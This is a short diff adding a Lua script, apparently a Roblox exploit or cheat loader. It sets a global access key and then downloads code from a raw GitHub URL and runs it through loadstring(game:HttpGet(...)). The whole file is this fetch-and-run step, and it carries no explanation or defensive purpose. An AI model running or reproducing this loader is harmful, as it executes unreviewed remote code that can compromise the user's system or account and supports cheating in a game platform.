@@ -1,0 +1,4 @@
+_G.Key = "THEONEPIECEISREAL"
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/omgae/01/main/Key%20Niova"))()
